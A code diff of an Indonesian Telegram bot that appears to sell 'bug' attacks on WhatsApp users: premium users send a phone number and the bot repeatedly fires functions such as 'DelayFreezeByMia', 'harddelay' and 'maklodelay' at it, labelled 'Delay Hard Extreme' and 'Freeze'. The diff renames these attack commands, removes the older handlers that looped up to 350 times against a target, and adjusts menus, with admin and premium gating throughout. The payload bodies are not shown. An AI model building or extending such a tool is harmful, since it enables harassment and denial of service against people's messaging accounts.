@@ -1,5 +1,3 @@
-// PROJECT BY @Xerozzz_Reals #NO APUS CREDIT 
-
 const { Telegraf } = require("telegraf");
 const { spawn } = require('child_process');
 const { pipeline } = require('stream/promises');
@@ -203,7 +201,7 @@ Alasan : Bot Token Belum terdaftar
     process.exit(1);
   }
 
-  console.log(chalk.green(`𑁍 token valid!`));
+  console.log(chalk.green(``));
   startBot();
 }
 
@@ -211,7 +209,6 @@ Alasan : Bot Token Belum terdaftar
 
 function startBot() {
   console.log(chalk.green(`
-ⓘ BERHASIL TERHUBUNG 
 `));
 console.log(chalk.yellow(`
 ⬡═―—――――――――――――—═⬡⠀⠀⠀
@@ -291,18 +288,18 @@ async function Hati(ctx, target) {
   console.log(`${C.gray}Target:${C.reset} ${target}`);
   console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);
 
-  for (let i = 1; i <= 3; i++) { // nih yang 3 itu lopp serah mau pake berapaa
+  for (let i = 1; i <= 4; i++) { // nih yang 3 itu lopp serah mau pake berapaa
 
     const loopStart = Date.now();
 
     try {
-      await DelayXdozer(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
+      await DelayFreezeByMia(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
 
       const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
 
       console.log(
         `${C.green}📤 Succesfuly${C.reset}  ` +
-        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
+        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
         `${C.gray}Duration:${C.reset} ${duration}s`
       );
 
@@ -312,7 +309,7 @@ async function Hati(ctx, target) {
 
       console.log(
         `${C.red}⛔ Failed${C.reset}   ` +
-        `${C.gray}Loop:${C.reset} ${i}/3  ` + // nih yang 3 d sini samain aja kayak lopp muuu
+        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
         `${C.gray}Duration:${C.reset} ${duration}s`
       );
 
@@ -357,7 +354,7 @@ async function Hati2(ctx, target) {
     const loopStart = Date.now();
 
     try {
-      await WarLockDelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
+      await harddelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
 
       const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
 
@@ -418,7 +415,7 @@ async function Hati3(ctx, target) {
     const loopStart = Date.now();
 
     try {
-      await KxHTrident(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
+      await maklodelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau
 
       const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
 
@@ -715,6 +712,10 @@ function savePremium(data) {
 }
 
 let premiumDB = loadPremium();
+
+// ------ ( SET COOLDOWN FILES ) -------- //
+
+const COOLDOWN_FILE = path.join(__dirname, "db", "cooldown.json");
 
 // ------ ( Setup File Admin ) ------ //
 const ADMIN_FILE = "./admin.json";
@@ -1352,7 +1353,7 @@ User : @${ctx.from.username || "Tidak Ada"}
      V  E R S I O N
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-Tap button below to continue
+Tap button below to continue...
 
 \`\`\``;
 
@@ -1466,15 +1467,17 @@ Tap button below to continue
 bot.action('/bug_menu', async (ctx) => {
     stopMenuAnimation(); 
     const bug_menuMenu = `\`\`\`JS
+━━━━━━━━━━━━━━━━━━━━    
 I N V I S I B L E   B U G S
-ⓘ /xinvis - Delay Hard Extreme
-/xintyx - Delay Hard murbug
-/xsvnz - Freeze Murbug 
+━━━━━━━━━━━━━━━━━━━━
+/specialized - Delay Hard Extreme
+/ephemeral - Delay Hard murbug
+/interactive - Delay For Murbug 
 \`\`\``;
 
     const keyboard = [
         [
-            { text: "Back", callback_data: "/start", style: "Danger" },
+            { text: "⟲", callback_data: "/start", style: "Danger" },
         ]
     ];
 
@@ -1514,7 +1517,7 @@ I N V I S I B L E   B U G S
 bot.action('/owner_menu', async (ctx) => {
     stopMenuAnimation(); 
     const owner_menuMenu = `\`\`\`JS
-  
+
 OWNER COMMAND
 ↯ /addbot - Add Sender 
 ↯ /killsesi - Hapus Sender
@@ -1530,11 +1533,12 @@ USER MANAGEMENT
 ↯ /delprem - Del Premium 
 ↯ /addadmin - Add Admin
 ↯ /deladmin - Del Admin
+
 GROUPS MANAGEMENT 
 ↯ /grouponly - Group Mode
 ↯ /addpremgrup - Add Group Premium
 ↯ /delpremgrup - Delete Premium Group 
-↯ /listpremgrup - List Premium Group
+↯ /cekpremgrup - List Premium Group
 ↯ /setcd - Mengatur Cooldown 
 
 
@@ -1542,7 +1546,7 @@ GROUPS MANAGEMENT
 
     const keyboard = [
         [
-            { text: "Back", callback_data: "/start", style: "Danger" },
+            { text: "⟲", callback_data: "/start", style: "Danger" },
         ]
     ];
 
@@ -1579,140 +1583,6 @@ GROUPS MANAGEMENT
 });
 
 // ------ ( Case Bug Menu ) ------ //
-bot.command("xinvis", checkWhatsAppConnection, checkPremium(), async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /xinvis 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
-    caption: `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Delay Extreme 
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 350; i++) {
-    await maklodelay(sock, target);
-    await sleep(2000);
-  }
-
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Delay Extreme
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``, {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-});
-
-bot.command("xintyx", checkWhatsAppConnection, checkPremium(), async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /xintyx 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
-    caption: `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Delay Hard
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 50; i++) {
-    await harddelay(sock, target);
-    await sleep(2000);
-  }
-
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Delay Extreme
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``, {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-});
-
-bot.command("xsvnz", checkWhatsAppConnection, checkPremium(), async (ctx) => {
-  const q = ctx.message.text.split(" ")[1];
-  if (!q) return ctx.reply(`🪧 ☇ Format: /xintyx 62×××`);
-  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-  let mention = true;
-
-  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
-    caption: `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Freeze 
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``,
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-
-  const processMessageId = processMessage.message_id;
-
-  for (let i = 0; i < 50; i++) {
-    await DelayFreezeByMia(sock, target);
-    await sleep(2000);
-  }
-
-  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
-━━━━━━━━━━━━━━━━━━━━━━━
-⌑ Target: ${q}
-⌑ Type: Invisible Delay Extreme
-⌑ Status: Executing....
-━━━━━━━━━━━━━━━━━━━━━━━
-\`\`\``, {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [[
-        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Danger" }
-      ]]
-    }
-  });
-});
 
 // ------ ( Case Bebas Spam ) ------ //
 bot.command("ephemeral", premGroupOnly(), async (ctx) => {
@@ -2350,7 +2220,7 @@ bot.command("delpremgrup", ownerOnly(), async (ctx) => {
   );
 });
 
-bot.command("listpremgrup", ownerOnly(), async (ctx) => {
+bot.command("cekpremgrup", ownerOnly(), async (ctx) => {
   const db = loadPremGroups();
   if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");
 
